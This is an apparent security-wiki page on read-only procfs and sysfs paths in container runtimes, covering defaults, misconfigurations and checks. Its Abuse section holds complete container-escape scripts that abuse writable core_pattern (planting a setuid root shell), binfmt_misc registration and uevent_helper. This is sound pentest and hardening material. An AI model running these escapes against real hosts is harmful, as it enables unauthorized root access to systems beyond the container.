# Read-Only System Paths

{{#include ../../../../banners/hacktricks-training.md}}

Read-only system paths are a separate protection from masked paths. Instead of hiding a path completely, the runtime exposes it but mounts it read-only. This is common for selected procfs and sysfs locations where read access may be acceptable or operationally necessary, but writes would be too dangerous.

The purpose is straightforward: many kernel interfaces become much more dangerous when they are writable. A read-only mount does not remove all reconnaissance value, but it prevents a compromised workload from modifying the underlying kernel-facing files through that path.

## Operation

Runtimes frequently mark parts of the proc/sys view as read-only. Depending on the runtime and host, this may include paths such as:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

The actual list varies, but the model is the same: allow visibility where needed, deny mutation by default.

## Lab

Inspect the Docker-declared read-only path list:

```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```

Inspect the mounted proc/sys view from inside the container:

```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```

## Security Impact

Read-only system paths narrow a large class of host-impacting abuse. Even when an attacker can inspect procfs or sysfs, being unable to write there removes many direct modification paths involving kernel tunables, crash handlers, module-loading helpers, or other control interfaces. The exposure is not gone, but the transition from information disclosure to host influence becomes harder.

## Misconfigurations

The main mistakes are unmasking or remounting sensitive paths read-write, exposing host proc/sys content directly with writable bind mounts, or using privileged modes that effectively bypass the safer runtime defaults. In Kubernetes, `procMount: Unmasked` and privileged workloads often travel together with weaker proc protection. Another common operational mistake is assuming that because the runtime usually mounts these paths read-only, all workloads are still inheriting that default.

## Abuse

If the protection is weak, begin by looking for writable proc/sys entries:

```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```

When writable entries are present, high-value follow-up paths include:

```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```

What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:

```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
  char buf[1];
  for (int i = 0; i < 100; i++) buf[i] = 1;
  return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```

If the path really reaches the host kernel, the payload runs on the host and leaves a setuid shell behind.

### Full Example: `binfmt_misc` Registration

If `/proc/sys/fs/binfmt_misc/register` is writable, a custom interpreter registration can produce code execution when the matching file is executed:

```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```

On a host-facing writable `binfmt_misc`, the result is code execution in the kernel-triggered interpreter path.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may invoke a host-path helper when a matching event is triggered:

```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```

The reason this is so dangerous is that the helper path is resolved from the host filesystem perspective rather than from a safe container-only context.

## Checks

These checks determine whether procfs/sysfs exposure is read-only where expected and whether the workload can still modify sensitive kernel interfaces.

```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```

What is interesting here:

- A normal hardened workload should expose very few writable proc/sys entries.
- Writable `/proc/sys` paths are often more important than ordinary read access.
- If the runtime says a path is read-only but it is writable in practice, review mount propagation, bind mounts, and privilege settings carefully.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | exposing host proc/sys mounts, `--privileged` |
| Podman | Enabled by default | Podman applies default read-only paths unless explicitly relaxed | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Inherits runtime defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime default | Usually relies on OCI/runtime defaults | same as Kubernetes row; direct runtime config changes can weaken the behavior |

The key point is that read-only system paths are usually present as a runtime default, but they are easy to undermine with privileged modes or host bind mounts.
